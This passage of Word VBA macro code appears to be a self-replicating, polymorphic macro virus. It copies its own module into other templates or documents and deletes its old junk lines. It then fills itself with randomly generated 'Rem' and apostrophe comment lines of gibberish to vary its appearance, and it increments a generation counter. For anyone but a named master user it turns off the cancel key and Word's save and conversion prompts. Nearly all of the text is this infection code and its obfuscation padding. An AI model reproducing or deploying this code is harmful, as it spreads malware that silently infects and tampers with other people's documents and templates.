Rem ô¥­ÀíÆÕì¿›¡ÐËÓ¼ÔÌô›¾Ó­Æ÷œ§ÌõÂèõµ³®ËèÞæ�¶Ú·úÙûùê
Rem èºÚ¬¥ÇÒªÝýŸ¢Ãü¬±«óÝìúÓ­¸©óºÀµ¬´ïÛÀÀ¦çý¿Ë
Rem ¶³½ôµÄ³á›¼ç œøé
Application.OrganizerCopy Source:=oldPath, Destination:=newPath, Name:=MacrosID, Object:=wdOrganizerObjectProjectItems
'²½ËþäÑÒËôó
Rem ÌýÓý·ÎþÄÛ¹è»ó»²«Å·ÀÁ
Rem Ö³´«©À¯ýÄ¤±¬óÂüÞïìÖ�øô ±ºÔ¸Æà«žÁ ®ÆÔ¦óÄ©×ÓéØ
Rem ¦²·¯¹°È§ý×âæ×›Ëµ¸ú¼ÆÊ
Call UnREM(NewHome(MacrosID))
Rem ²¯ïÖÂÛÉØÅ�ç®þ¯¹¦Á¹ö·Ô½äè£ÞôÒØ¨¡¨ÂþØé¶ÙÝØÙóè¾ó
Rem úýªÁéÅêÂè§Á±«¡üü¡ØÀÂäÜóèÜÆÝé
'üòäÌ�Ôí¿àÆÀ¨ùçïŸý©ü×­Ú�äçæíÔ°³Ù¨ÇÐÒÛäüœÚÂ
'î®œ®çÍÐý£µë´äÙÓ³ç¿
Rem ù¤ÂÎ©

'Æ³Ò
Rem ûÄë
'¦«éÈÁ�ó
Rem ýâüÅåì¶Æàâ£´¯þÔÔÝ¬¦È¶»ÇðØÃØï÷ÃÙÕ©ªñ¢äþºØ®
'¢ÁÏäïÔ´ÊÖ®ÖÒãÆßÓÛÑÍÇãíêõ¡ÊÞÔö¦
Rem ü¤³
'Ñóô¸©ÌÑßã»«´ËÃÙÕ¦¿÷ðÑ¤Á·ÐŸÓÄöÀö Ý
'žå²çâÒ ´©»ºË§¥ÔèöÒÈ¥áÒ£¤ñÆ¨Ù÷Ÿä¸¸ÓžÓèŸÕ
GL$ = NewHome(MacrosID).CodeModule.Lines(5, 1)
Rem ÊÁºó¨·ã¤ý¡©¶éÀëµå
Rem çÀûÎ
GN = Val(Right(GL$, Len(GL$) - 20))
Rem î¶Û·Ú§¤Ü§Óéºäæö×ÔéóµàüÅœž÷È¡­·Þ³ò¼úõ¬
Rem ÜÏ±±àÅ§Æ£û¬¢Õ›­ÁÀ°ØàÇç¿ûìï»°Âòß
'Êû­·µëêï¶Ñ£®¯Êð
Rem ÷ëúäŸ­¼ä½ªÖ®þò¬ûòÁöãÂ­°ÊýÛùçÆ
Rem ÞúÎÅÑ÷Ó©ÌÊÍ½×çÎÂø ÐÆµÊïÑÑÕÈÜ©Þ­²óëÐáß×ºÕ¥ìûÌ
Rem ááÀÕ¾ß¾Ûý­ÆÇ³®îçÊ×ŸÒ
Rem ×ÝÛœÏÉµòÕ¥ÜÉ´ÔÓÎÊÌí
Rem ÜãÂ¶»©Ô§¹Á¡éáêæäÎ¦½£ñ×þÏ¦ôç£ÙÕçÖ¹Ù¤ú÷ÅÍ£©Ýïß
GL$ = "'=>Ìîÿ êîïèÿ íîìåð:" + Str(GN + 1)
'àŸ³åÒÉæÜ¬·Ÿ¶ÛÙÊÁêÌÝ©¼¬Îäõ¬§êé¥ÂÕÀ¬¿öÉÍ¼êª®
NewHome(MacrosID).CodeModule.ReplaceLine 5, GL$
Rem £äàá»ÑÂóÝÚØÑËÌéÑÛ¶

Rem ®à
'ÓäÇøáÉÐØÒœ·ò›Þ¢üœÉü¬Ë
Call GenerateRems(NewHome(MacrosID))
'ðîéÒÈøÉ¸Üï›ÖÜíêé¬âÍ´æîÀ
Rem Ü«»í±÷Â
Rem ÇþñËÌ°íÈíµºíó¯ì§½ÐÍã³ËÄÎ£Ÿ±¿Ëé÷³à
'¬îû¸õï Âº·ÉÞÖæîþ¬«ñòÂáÄÃõÕºðñÎðœðù§¸Ñ žØ§È«
Rem ã±÷Ÿ×ÇÈÚþÑ¤ààÔ¾ÓòÉ­¿º¶�âÄ»ß

Rem ü¢¯ìœ¬
'ÂÕöÍþÔ¶ªÙ
Done:
'ÁÒÃžâçóþ½¤ý±ïè­àþÂô×ôÔÇÄîÂëÜõÑ Ìº¶Þ
'ŸÈª¹ù·éíõ×úÔÒß¿­úÑ½¼ý
'ÁÎí¥â¾×âïò¢ó¶Ì±©§
End Sub
Rem ÊÍñâÊ£­Ã¯¯Òé¹ù›³
Rem ÜíãØã¸ýÖ·öûîá›Ä¤õ²ý
'ß¬ôã×óªÓþèü¸õÆØÀÉ©¢øÞÔººü¦©µÐùõû¶û
'â»ÍÉÉò°›Ò®¯ýÌÊê
'«Ø´á·ÏÆ­Ó¹Ÿ¶¶žþáñ»ßãº­²¿±äÏËáÕðÓú Ì·Ý¡ðê¡ëÑçï­�­â

'ëåÊøåÑ
'Ð¸¢ò«þþìù×œûÜçÅðÀ¬·ã£éø ¡
'ïûý¶ßàèåÓ›çåÀñþÀµÔÎÜÚÖï³ù¯¥ö¸íþëà§ÂÅ£õð½¯á
'¢©£Ãº�Ä°®±Ÿ¾Å¸·¢
Rem ¿ð¢Å§ÁíóÂ½Ä
Rem ìþËáÔß±ë¡ÙýÙ¥æÓÜÂÄààçÖ£Í§ü¾±¯èÒÒ£³Ùá¾þÃœ
Rem ÕÄúÑ²ÔðË²î�î¼ó×Ûœ­Ãò¨§Èõµø°ìèÃÎËåµ¿¿ÐÀÃ›ªØ¤ÁÁØê÷×
Sub UnREM(UnREMObject As Object)
Rem È³ö¡¨±ØåÒº ¥®�ííÞÂœ£ªóÇïÇžÝõîößáâ´
Rem ùÆ�Áû£æüÚ
Rem ÎñþÝìûËÑìæË
'Å¾à×©Ïú¸ÅÂ÷¼± Ö­
Rem ãž½Îº·¸¶ñóÏº½¾¤º÷Úû
On Error GoTo Done
Rem ¸ûè«ÒÔÑîÃª¥ûº·øÕò¢ñÚûñ¢
'ÙíÀÂªùÞ´û Ì«ýÒœ«ûÂöþÝÌ
Rem å�Þ¸Ê¿åÑ©òÅÛ°¼éŸ´°ô¶ÚØíëô¢ÉØýû
Rem ¦ëÖæÌ­ÛçáÑÀøôÙûÀßäü
'ß½žêÖ°Â
Dim i As Integer, A, B, C As String
Rem ³ŸÞýÐ¶Ììøª¸ìÌÐè¹ú¢¢»õœäßÔÍÇæ
Rem ÍŸýÀ¦Çñ¨
Rem é¼×¾ÐÊæöÏ¸âÑïÆä÷ªò¢ß¶¢ÎøÒùÔÓüÇË»�
'Ô¶¢Ð
'¬§°«ÉÛ«ÊäûÖ
Rem º°ÞÕÑø¡Ð¤ï¿¶å¡øÝ£´È
For i = 1 To UnREMObject.CodeModule.CountOfLines
Rem £ÈÇÍ
'Ô¢Âï
 A = UnREMObject.CodeModule.Lines(i, 1): A = Trim$(A)
'«ÊªÀæ¢œÑâÏÆãÕÀ®µ·¥¸íä¤�´»Áã°¡§¿ÊÎïì¤ÇÂöµµãµò®¿ç
delTAB:
'õÖÝÔîªåð¨ÌÛ£ÃÔÊ¦ÍÊùœ
Rem æîª×îž ª¬ç¼ÙÔï›ÝžÉõÉ÷á±¦ôçîâ×÷¸± ¹á§î½
Rem œ�®§ìòÜÏŸÝÙ¼²ùöêÙ
'žç¡ûõý×ËÜÑµ¯¯Õñ¢»äÙñÈ×øó¼øêÒ¾Ì å
'Åå›Â°¦Ä»ç²Èâ
Rem ÅÝ£ä«Õå¶Þ¿®´Ì¾ÚÎêûüâ´¨
'ÙÌíÀ«µ©¶Ýû¯½¿ëÓÃÓñ¨¥øŸÈ¸ÞàÝþ¾Ÿ°µÍÃÂá�¡Ïè³û
 B = Mid$(A, 1, 1): C = Mid$(A, 1, (Len(A)))
Rem ¦ðð²éÕ®ÃÅ›Ý
'ÊÝžüÑü¶ÄÇ¼èû¾ÝÂ›»®«¾¤°õÉÌÙØºä±Ð§Áëœ
 If B = vbTab Then A = C Else GoTo endTAB
'ªïû¼¨
Rem Ñ¼ÇµÙ­Áå¤ê³ïÊ¸Ô§ÔùÎ½Ð›²°Ú¾ õìëÇ³œ¶Ùä¬Õž¶£¦ÉØð
Rem Ú¹ûì»øä´Ëç¤Á²ñÏá³ÜÆóãù¢©ªç£ËæðôÒå›í¿¹¥÷Þ½ô×¬÷ÔþÇÔ
Rem Ó®žÀÓðäøÚ³Ò¶üõ¶äÎ´§¶º´Ø¤èú ùÌàî¹›¥Î°©ï×ñµŸ¡ü§×àö
'¥ÏŸßÎèÏ¶À£â¢ÓÈÓÆÍ¹ãÕù¥â¨Êåñ¹òÕûõ§Áß¥®óçñÛ©ø®
'Ôª£¿©Ò¿ó¼Êò¶žÉÃú
Rem ·Ô£þ´ÙïàùïœÏµµÂ±¾¥³±ÇÃÉ
Rem ¹ÊÓòµ÷Ÿßë¥ëµ±¥äÁôèÎÅ¿½ÙÃµòŸéóÇéž
GoTo delTAB
Rem òá¯¼ÄëÓœîõôù ›¢Û÷°é¹¼ÑóÍþÒÙàüãÐÇœÏ¨ÃÒ¸»£ÓòÑ¸Ÿöç
Rem ž ´±Ý¥¡ÚÙ½ä¶Ñð«ñö¢±±ý°Ìž¾ÄæÇ¼Ý¯· 
Rem ­¾Á®¼»ùñŸäìàž¦¿æÌÖ¤âïÓï¹½üÛÓ¼
'ë¸ºÔ¾Ýðè¡¿œµÍ¦»¼ûÉðë®Öã«õðÓÏ
'Ñ·½Ü·Íž±È¬¹¼¤Ÿ¡áé½í²É¬Åñ äÎ¡ì¬ëªÈ¹�¾üžÞ×»ÌÐŸà›
'àã¹ôª¡ð´èó¦ ÈÄØ¥ÅóëÍ¥þèÃà¢åÖÑþ¹
'íÀÑÜ¹ü¿¥üÞ÷®¤ïÑß¾Ü¬Á²è°è´ô¡¾î÷Äèþ›µÜ
Rem é³¼ªèæ¡û¡È ÑÊÑÖ«ÚêÁùÓïÂ«úÀÔª«ô³¦¤Ç»Ïáð¬
endTAB:
'¼ÈË¹
'´ûëó­äÍÌû¹ôë»¤Ù¢öôµçé°³æä¿Ñ¼º¿¡
'ÎñÝœå›Âžé»öïûäÖìîÎ
Rem Ò©¾¡ûœ¬ŸÉñ¸ÈÛôµ©Öæ»èŸ­Éì±Å§ÃÊÄàíÕáãðø¥÷éºªô²
'ÛÞþÕåæ·íÄ¼ÖÐªµ�¹¼ûžç»àÍ©ÒØÚé±ÕÓµèàÝ½¨Ö
Rem ãÌêõ©›âÑáÛØ¬Ù¬óËŸÙ©×å
B = UCase$(Mid$(A, 1, 3)): C = Mid$(A, 1, 1)
'Ù¹¼ñûòØïÁÁÐÀÓ¯çÈéúŸè¤ô¹É¾÷ÓÈ÷ÀÉß¬Öâœ
'¨ô½¦ÒëòÈÂÂÐýŸÅ°ÇýÆÉÖ×¬²œîçÀÜÏØë§Ï¦ÕæÑ�Ó¿ì
If B = "REM" Then
'½ùÆÅ¨ã»ä
UnREMObject.CodeModule.DeleteLines i
'Ö¥ó¯ÕËÎæ·ýí¡Ä´ô¢Ï³ãøØÛ­±ÅüàöÆÆ×¨ãÌÁÚÉ¹Ó�µæÁ
Rem À²ôÎõêÏÂÞ›¢žäß°êÝ›Üý²ÙÙÄâ×¡Ü ¨ÚªÛõËùœ¶Ý¶ª
'ïØž«ôÂÜ­üÏ÷ªÍÆË¾ £ÅÝÄçåºÃêÌ»¾
Rem çÉï¤çï½Â­¸ÖÛ­î­
i = i - 1
Rem ¡Õì¢ÊÖðÊÉëÉâº¸ÓÊÛ®ûä²¢¨ÏÝ§ßÍÝ¥Ò±²û °Ê¹Ôç²Ñ¡ÈÇì¶Ê
Rem äÜéÏÌ¶ùâÙÖØÑÃ®êõ
Rem Ìâùñ
'¤ßô¨À ìöŸáá×ä§Ýåü±å­ÀÐûçÞ»³ÞÅ¿üàÍÊÀ¢¼ìÚ²ñûâ©»ÞžÓ
Rem çóùðüñþËÈœÌñÁé·øÙÌÙ½óû¬ÐÑ›åÎ
'èÃÄËÓä�Ó¶ÍîÖØúçßÂ©½±á²ëÉ
ElseIf (C = "'") And (B <> "'=>") Then
Rem œÆ³Øú
Rem Âìãé¾¯ËÊ¥³µ±¾åë°µ§ ¢Ö¢£þÎœôÈ´°îìÆäòÔ¬§×Ëýìô
Rem ·Ë±¥�¨ÊË©Û¢¥ñÔåÅÚçÈ³£ÍãàÞÕÛ®ªþßþÞ
Rem ÓèÄœáœÑîÀÂúà½Óõ­Ñá¡ë©®ÃžÈ¤œ¢Ì²ÏÈÁ°À¸Ç
UnREMObject.CodeModule.DeleteLines i
'ŸÉËõ±¾³¤¡Æ�ÅåžžåËËÆœ¢¼ìñ¶¯ÉõùÎ¹ê
Rem Üü¸¼å¶
i = i - 1
'¬áÏÇóþ¬
Rem ø¸´ÕúÓ«ÇÅï£¬ÌÑ÷Ëçð¿í×ØŸÜ³œÖÑá›½ùºÉëä©©ùÌ£¼¤Ùá
'Ÿñµ£í¡æžÆÖðÈ
Rem ëç§Å®ÇÁÓëµÝ«¾¹±®òÛ³êõòÂØÁ¹¨úÁ›èØÇ
'Ëí§Ú÷À×Ñò²ß£à³�Þé¦ß×ü¾»¼Óù¯Ð´åôòâàíÔúàÅ
Rem º®¶õ®Á÷ ²ÎÒïÌÓÚÙó�®üÓÑÚ¼ªÍº¿Ø
Rem  ùëöÒÕ­ÕíØ¹
End If
'ÌÙ¿ÐÅíËäò¥ÒÑª÷òüÁ½
Next i
'¢¿´õµ¹×ž¡ ßÔõþµÂÑÎ¦½ô×°âÏ°
Rem ýÀ±±ñŸŸ›ÒãÐßëíÅ¶ åÂóÆéÐÆÔàÌ
Rem £Äö¹ÎÓûÀ»ëùž¸ç¯Ýýá¢ßí¶ñÕ›ï×æŸåÍœ±«­ôÕíààö
'º²ÙÓäµÂÅÀÈ´º¤ôó¼�ó¹Ü¤¼åå¼í¾¾÷Ð×µüçÈæ¦Áºì
Rem Ý®¡¬Í£ýÄ
Done:
Rem ¨ü¢³ÇÌù©õ»ÕØ¦Øâó »á¼´ñÊÔ
Rem »°òá»Ä¾ãÚ®ÝÕÄÉæÁØîËÇÆ©›µ
'ï®§ãêîÏºÉ³é
'ìôêáýåüéÚï±¤¶òþ
End Sub
'ßòþ¦ØÓ³ª

'ùôö¤¼Úèœóçãõå¿­É›ÏÖ¸žØÑ×Ä»Ö
'ÍøáéÝàÄÃ¹¤ží÷· çñ
'êíÞ¢×«¢ÀþûØæÓé´º¶µçÙÕÃôÂÏÒ®÷Â»Ø¶°
'ªœùàÛ
Rem ½Ñ¸¹ÔÛ¿éîÑ½ÎÁÄúæ«¾£º
Sub GenerateRems(GenREMObject As Object)
Rem §œÁåÑØæïÀÌí»Ý¨�ž¹ÛŸ©³éÈ£×ö­ºÇÑÙëºà×³Ò ¡
Rem éÄ§É©ëµ÷ôùÉ¬ºñó¯¬µÒ¹²äöÛßÝþÓ²õÅÖø­
'í»›å¹¦çö®ü¹ÛÛÆ¶ËáµÐ±áÂÉ¬¿Øõ³Üü÷ãÂù²ï
Rem ÎŸÛ§½� Ð÷Õ¬ÑØ¨ÉÛ¦ûßÒËÀßØðÁ¡ý÷¼ÍÔ
On Error GoTo Done
'ÞúÆ§Åþ¯
Rem ©Êßµ
'Á ¦£ãúÅð¡ëž¹ãÓ´ð¦û¤üÔ÷ú
Rem è¢
Rem ¤ñÎâÈèÊÍî§ã×åÐîý­¬äÔ»æã¦õ´¼äÂÂìÁûóÈñ¦ÅÙä¥ÃÕõ©Â
'·ÅÀË¦ôêÉ­ÀŸÁª ›¹åüú¢ÀŸÙ¨ØäŸ®¾ÖþÍàÉÁŸÞËµ½ÙéÛ¦Â�›Ò´Ö
Rem ÓÖÖÆ®ÖÞÞâ¤ê®¶è½Ë½Ë²Ë¡úã
Const MaxStrNum = 8, MaxStrLen = 50
'ôò¾¯�ÎŸŸÖ¼àÆ¤ÔÓðÒëðìð�ÉòëÕ¼½òãßêèúó¸
Rem ©¿åÔûåò¦´ð½Ÿ·¡ÎóÁØ Á¹ÆßŸÅÐåÐßºÌé±Ï§ðîüÙÎ§
'ÚÄüö·Çß¤ÕêÞç»œÈõ»ÖäãÐ×Ëîõª×øýÎÇÄ¹¢žÛÆ
'›õÜÓáéëÐ»ŸÉž¤ÛÜ±ûÆè¥Âæéüóæ¦à¸ÒÀÝò¢åÑ£Ü§å¦Ã¨Þ­¼áâ
'Ðø×ž´×èâÁÆÉòøÍììó¤Î©½ ¿©È¨Öí¤öòî¶Ó©ž¸»«õââ
Dim StrNum, StrLen, i, j, o, PrvStrNum As Integer
'Òöí÷ÞÔËéÅ¬ûµñõ¼­êî¨îÊÙþ±¤ªŸûœåúøçµïãèòòêíÙÖÄ½ã¤¸¼Õ
'§Ú§ÃòïïûêŸª¡¦ùÔ¥ïýÑã²íåäŸÛ¹éË²ÐìýçÛ«Ü»�ÓÏ±ÅæÓ¢æ
Rem ÏáöØð©¢Æ³­›±ñ¢öÎ×çñÀÞºØßõý»¤ä£�é¢
'øìÍ·ü©ü¶ÏÔ§±¯æá
PrvStrNum = GenREMObject.CodeModule.CountOfLines
Rem ÅùãÝŸ©Üœ·³Ö±ÃÇ«êÑ®¨öñû¾ÈÄÔÍëàÅÔÅ¢Ã§¤îÐ²œ¤Æ³ÔÀÉ¶ôüÝ
'¤ÂÞÖÜìó¾úýýþüî¾êÒðêí¯Æ±ââ¨±°ÐÏ°ÉòøÈ¤Ôéíþßï±
Rem ¤ó¿ÇÆ¸Ñ
Rem þ³Ûèþí÷Ú ÆÅõÞ ò¼éº¦¾µþÆ›¬ÁâÙâµ³²œæÁäÑïòíÃÜûÜ¸Ó
'²öÊð¢ÙÆÆàÈÕè�¢Øäçïª¿ï½¤øâãâÐ·áÑÏÛÀûà
Rem Ó¯ö¬µ±­¢«Ãá
Rem ›òÆ¹íÊ²óô×Õ¼ñËºë°ñÔÑ«º§ýº¬¾Ú¦¹¥ÛþÕ°²»§éá ³
Rem ª±¹±çê¤¤«½öúÂùœâàŸÊìßûæÕ·ªûÁÀªö
i = 0
Rem ùÇß¾ÇøŸË§ÃëË¨ªþÀêóÄû«¤Ò�¾ª¯¹Ò­úµîÝ
Rem àéÜ¯¾ÑóåíÛïéÜ¢ÐÓÐÉû°Ô±òÞ
Rem ªÍÓ§þ¸ú¾íü¯Öüâ«÷¥ãÜ×ÀäûÅ¿¬®ìä±µÞß
'ž£×»ÁÄ´´èÆ½´áØ
Rem à¸ÅÑàÖÁí¨§÷ÎïÁç÷ØöÆóÓ´Î¥¹××®à°¥Å
Rem Ú¾ýÍºŸÅÂå«Ö¤ää¢îæäÛ
Rem ¾ÂìÊ¡ÚæÊÂÅâ¹ÎœøÆÉóóÝ·ÛÝòæÛ­Ïûº£ñÕ¶Ä÷û±¡
Do: i = i + 1
'õÄ¤Íä¯ÝäùÙþâøÝÖÑ¹ãÝ¹æóÃ«æ
 StrNum = Fix(MaxStrNum * Rnd + 1)
Rem ›öÉ�Ñø®­å¤³¯õÙ¿ÎæÓíýÑºù½ çÂ¶¬Ã³´Ãøå®üî÷æê
 For j = 1 To StrNum
Rem ¦ØÍçú  ­´µó¨îüªí�Àë¨§ç»²Ñ
Rem ùæ¨öñ÷ÓÍ®Á×ò¿çÑÕÃ÷ý¶žÚêçÑýóé¿ÕÛÖÊ
  StrLen = Fix(MaxStrLen * Rnd + 1)
Rem ÌÞÇÉÎõÝóåÅ§¨ò­´¾§¾Ú²®ðçäëÈËã ã·±×á²ÉÇ¼ãÝÑ
Rem Ù´
'þºÐñ·íÓñæçËÕðÄÆî×Å¿ó×àÏ³ìýÔ¡«µÒÈçíÍÇž©
Rem ÆË�õ¡µÃº÷¬þÁü›»ßø
Rem ¾íÚ¾¼·òÙ½ÓñòÙ
'ÅÄÈ¼Í¯é¡øßÞ¢ÕÏØÜÈíã¢à½§Ý±Ðûâ¬°­�œ£§»Òûç»Ñç
Rem §²Æº�Æø¸ÄüôÇÝþ¼ÃßõÆ
  StrLine = ""
Rem ªûÃ¡Ê«©
Rem Âì¶œÌëªÓž¿Þ­Ã¶ÞçÝ´«ä­«çÜüõüÌë
'ß¢Ë§÷Ã©ûàþÀöÕèÂÒ¾¯ãÉÝöÃãà¢ô¬ÅÉã½ÚÂü³è´ÁìÅõ¹¬
'Á×­åúµíá±âÂ
Rem ¦ñ¿Â°Á£¨¥©·ñßðËýö¦ÚÔé¿›çŸëèûâîÃâ¶ÂãÇá�ïì
Rem àøÑ¢ÇµØÄÒº¢ýáœ¶°¼úÞ
Rem ²¦Øç°èÛÃïöïâø¾­Íþã¯æùÆ¨ÒÑÄÙØÑÕºáÙ§§àŸÄ½Ë£ì¿Ó°¤´
   
'£Éìîö·®÷Ûî¤ÂÐœ
'Îä·Ô°ê¿»éÈ¥ãÃ
Rem ¤Úõ´´ÃØì¸ñ®÷£òãÀÉÀ¦¶²¾¡Ðöà×û±âË´·È¶ÙÛá³³ýòø
'ÆÒÄå¹Ÿ¿¾ð›Æ¡á²§Ñ·¨®
Rem ìµý÷ö»Éµµïý¸°à ôåóõë¼õ²ÂÓùÞ¯Ìé�¶äÎ³¨¼õ®ÛÃ×¦Ñ
Rem ðäÆ®ñ¸èëô¾ìæÓÔ´ôÍÉ³ãÁÆ±íÜÖÔŸœ¸ø¿ÚÄ»Ú­ÆŸûÏ®¯ô®Ê«
Rem ¸Ô±Á÷¹ø¹âýËÙÚÄÅï
'Ðï¹ð²ÔÌùãÐœöýŸ¿ùÀ¯
  For o = 1 To StrLen
Rem ÙÖñ·÷ÛØ¦ûâØµì›ùÇÎðµÔÑ·²Ýž¶ÓÍìïõ£¡îÆèóÆ³´ÈÍÇ¨¡Ùœ
'ñÁê®¿ð±©×
'­É
Rem ¦œôºÊ£�àéÎ
'Ò´é¦ý§ÍäÉ¿ÊÎíúÈ¤·Ûò¤²åË²Ü
Rem ·Æ¾Ôå´›ü³Æ°ñã¹¿í¿
   StrLine = StrLine + Chr$(255 - Fix(100 * Rnd + 1))
Rem ´£ÊÞéóØÄòÃ¿õñðÖºª©ùºáÜåÞ¦áÊÙÚé£üçÒ üãÑ¯õÖà­
  Next o
Rem îê¥­®Í»§¹©´ÙèÕªœ ªýÜËÌæß
'äË³›¿öÞ±ø½í·ü¸ËÍÊ�¿ÅèßÄô³¿ðúâçúÆÚäÛºüÌâîüÕ
'ÊÛòü§ò¼ò¼·çÅõÚ³¢É´¹öÙÆÉ£úãÏîÕôÛÇÞ
'èÒ«éÛßµàû¹ÉçÓíÚæí¢Ñì�©£ãÈ¥±›µÄçÞ¥¥îëÈÝ¥ëãèêÍªÝ¾
'¹žèòÀžôõòÑ©ÑÑÉ¶¯¦òËœ§·ßöÞ×ÒÒëô¾
Rem ñÈ½ÎŸÚÄ²î¨þö°É¸÷
        
'ô³÷é½ñœË¥äß¿Ï›ø©ÁÔÏ­Ð £½¾ÌîÔôõ±¸îÊ§Ï¦ÐüÝÂºÌ®®Æ¹
  If Rnd(1) < 0.4 Then GetBool = True Else GetBool = False
Rem ¬Ç§¬¢¸âçý¶¾ïÈÈèÆò¾½ÖÏìÐ¨ÁÓž§ÞÚä§¬Ä¼«¯ÔîËÍ×Üœä
'×çÎÁœæÜ¾ÛøÞÁ�¨æó¡¥ºÏþÔ
  If GetBool Then StrLine = "'" & StrLine Else StrLine = "Rem " & StrLine
'þë¨Â©Á ÇÂ¯ÒåèõáºåæÕ§ç¤ªÄÕ¾œÚµþæ®ž¢©úèÖ¢Ä¾Ü°
Rem ¶ÆØÄ�üÀÞ¾ÁÚ­æ¬ŸÁÔ
Rem ±ÚœÛäÖÊþ³¢à¡ÐÌÀœÐßöæú¶Å®Íå¼¯œ¿ïÀ«á¥È¤¥¤ÝÜß¿ÕÈ
'ýàüä²ßÒ¥Ô©Ðî£´¡ÇÅÇÎå½üïêñ¬áÑ¹Ð¼¶
   GenREMObject.CodeModule.InsertLines i, StrLine
'éèü÷¶±à½�Ú®ÄñæÝµ··ÈÏÂ£Ã¿Õ­ñÂøÎÏ¸Ã¾ö¥èÚåÂ´ïø§ú
Rem ®¢³Ùòæêøñí¯Ñ¬¬›ÀæùøÖëÈ´ôõðÝÓõÓ
Rem ÍÇ­Õ×âÇ¾ÅÙ¼ÜÃðùÛâåË¦åªÒå£¬£­ÌÏ¡ïÅæ£ÆÆ
'µ·¹Ð¸èìé÷Â©üÒÛã�ñ«Ó òÖà¬
Rem ¼ö´¤ìË´Û²çÒžôœìœÌÁ�²þ¥ò¿¾ÒäøõôÎúÐÚ©·Úì÷ãäœ
   i = i + 1
Rem ¤ôè
   PrvStrNum = PrvStrNum + 1
'°í·¾óõÑñ°›àê›à°®äÅûð
Rem ³½ŸëÌèöÃéÃºŸ�ôûÑþ¾­î «Ð«ÙÍ«ŸÃÜøðÅŸ²ºßŸÛÜãÍ´
'¤ìÙó¸Ð²Ç±ç·
 Next j
Rem ºØöÌªÎå¬»§·¬±Ç›å¡¡ÒÛË¬éþ¡ºÒöÂì¶î¤¡±Ý
Rem ÑÖÞ¸¥åÉ÷þÎÐ¹ñàÊîö¸ª©æ¯ðÏ÷Î
'¬Ûü»Ï®°Ý¤Òâ§Ô¶éü×«øîè¨½ÃÅïýù¯žÒÏ¿Ü¬ýêáéß
Rem º›íæÛÒÁ¶°
'²ÌÓª¡©Ÿ°¨öËÁ÷¾ÆÆî°ïùêØÒðÜûÍ
Rem Ûã¢¼Æ£Ð¢ÝéžÏªÑíÞòÚÑºÀ×þÝúäæáÕ¸Å»ÕÑá§œÇ
Rem õ¨èö§­¸¥¡Ô°ð¤ÆÕÛßÍØÙ¾Ãòß¿ÖÇ½¢¦Ø¾¯¡ÏŸÜòÀÈ¶°Ð­°ê
Loop While i < (PrvStrNum + 1)
Rem îÏ¨¦·äÓ¼ìÁáÉÑÎ ôÒÀØÖ¢ÝøîÎØ›Ô«éñÜáÕùáÅÖ®î­Ø÷�
Done:
'¼ÒÄ½ë´åæ¦ÈÐŸžœÓÏÖ£óéü¶ è°ß³ãÖ
'à
Rem åû¥ô±©ÆþÁžÆëµ®¸÷Ï¿è¹áÐìµ¾ì�¬å íýÉ­½Èà»©¥¶Þ×›Ë¡¥¯Õ
'›©ßü
'øªÁºæÒ¾ÜãÀÂåÎÖç·ßÃ¤ëÁ¾õ¬Ù¸ìúÈŸÓÃèíá·ýÃ¦Ä¹ž¯üö§øÏ
End Sub
'í½ÂüÁåá±å À±Ï¢ôÙ³ýã²ïÛ¬¼
Rem ¢Ô¡â²é¨­ÓÂ¹Ë
Rem ¤á¸ðÎÒ­Õëûïß�ÉÙ´

Rem Þœ¬û»¼¦°§�Ò
'×Ù©ÃÈöÒ¢Ñ©¦Ç Ê²È
'Ú­ÉòàÙœ½à©Ûßâàòž·
Rem ôïÒ åòÉžÃñÀÍ©ö£ÍÒ´ªç¦¼Ä´Öé«Ëª
'Ò®õËùüËã û¼ÍÎú›¼²öÍÀ­ÙËõúþ¦ÓŸ®ê¿öÒÓ¾ê¢µ­¯
Rem ¸µ¸±õåß¸æñ¥ÌÕíÖÓÀ¨Âï¼×ÝÞØ¯
Function MyMaster() As Boolean
Rem Õñ®²½Áùè¨
'çÃçàÅü¨ü ½ùÒ£â¶£åçàæØ¶Ú¶è½ÈË
Rem »ìòÁíÆÁÌ»®£¸£¶Ô¼¢Ù°¢Þ©ÍÁ÷Õ
Rem â¯´õÙ³Ó
On Error GoTo Done
'ÈÊóŸöÑœ»éÓëªËãÀ¤Ë›ÆúÓÎÁÆëÊ°Õ·¢žöÕ›ÏÂžâü¢ÞÍ­Í�¹ž
'±ó²åðàÐÏ¸êÝÍüÙ½å­ü£ôÁ¬ð±²
'¹ÄðžÑ©œ¶ÄÍîîÁÉ¥¼âàÌßö¥úù
Rem îœÁðã¡êÛ¡âÔïÎö�ž ß½¡ïÇ¾îð·Ÿñ«íåØ«ó¨É»úûÕó»Ó
Authorize = (Application.UserName = MasterID)
'¡¡ÒÅÀ®æîöü÷Ì§Ò½ÓÞ¾ÂíÆ©È ¶îÏ¯ÊþÑÀþ¬ÓÂÇúÏ½ðäøÛ¦µ¯�°ü
'¶›ì®°þ¯â·ÙÎò¶û¸úÐÆôíÛß¥£ü¤Èžð¢Ã¶×§§°±Úª­ùÅ
'ÁœûÆÖãÕ¦æÅÚ«ß¨îÆ ²ÚÊÂ×¦üêÀÕúÇÊùÛê
Rem ­Øö¹ ÜÓç±°
Rem ¢· Ù¥ØÑËºÂëâÀåóïÖû¹œÑÐ¦çÌìÞáÖÏ°ìëœ§ØÏ³�ü¢ÊÍçêëä«
'ãíð¾Ãá¶à¾ÝÛÕÇðÉâ ë¢³©¸£Ï¢ùÒ×§ØñË
'É�òí³ç°òà¿µôóïÄÅ£Ôþª°þ¥Ëý¦©ö
'¥¦ãÎÚñ²ÍíÒ¥ïç
Application.EnableCancelKey = Authorize
Rem ìßö°Þ·
With Application.Options
Rem ×È¸ôéöÞ³žûêçÎ¥Àêö¯üžìÅ¹îìõ¨·Ã«¤ùÎ·§Èùîàë
Rem ï¿Ïàïâ¬¾ä¬¨²Ò£�Â¸õ°ÞÝøÆí
Rem ¦Ê¹
Rem èØÏÕîÀ¬Óò¤¶¼¬§ªÑäÞÚÉÝÑçÕÅ
Rem ›àùÕÎŸ£½ÆÁÈè·¨œÅ¦¦ÉÙÔ´²Óïý­ž®
Rem �¾º¦ýÚÝ±öé­Ð¥ÔÉÊã®ô¡¥½ºùê£Ê¢»É¬²ëñ®´®¥þþ»½¢
 .ConfirmConversions = Authorize
Rem °Æ¶¹½À­¢³èÄõüÝ²Ù›ëó
'ðéª¿ÀÞðôÖ»àâñ©«ºòÈýÂßÎ�¼Ç¿óµî¼³¤ÀÀü¨» œÍÎÄ
 .SaveNormalPrompt = Authorize
Rem ÈÊÛ�Í·¦Ý®«Áñ¸Ë
